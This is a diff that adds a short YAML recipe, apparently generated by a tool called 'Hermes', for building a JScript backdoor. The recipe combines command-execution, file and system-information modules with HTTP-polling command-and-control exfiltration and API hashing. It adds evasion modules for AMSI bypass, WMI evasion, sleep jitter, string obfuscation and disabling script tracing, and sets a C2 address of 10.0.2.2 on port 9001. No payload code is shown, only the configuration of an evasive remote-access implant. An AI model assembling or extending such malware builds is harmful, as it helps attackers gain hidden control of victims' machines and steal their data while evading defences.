@@ -1,0 +1,22 @@
+name: js_backdoor_cs_v1
+description: Auto-generated recipe by Hermes (jscript)
+format: jscript
+core:
+- core/emit_buffer
+- core/run_cmd
+- core/file_ops
+collectors:
+- collectors/sysinfo
+- collectors/processes
+exfil: c2/http_poll
+arch: arch/backdoor
+api_resolve: api_resolve/api_hash_djb2
+evasion:
+- evasion/amsi_bypass
+- evasion/wmi_evasion
+- evasion/sleep_jitter
+- evasion/string_obfusc
+- evasion/wsh_trace_disable
+vars:
+  C2_IP: 10.0.2.2
+  C2_PORT: '9001'
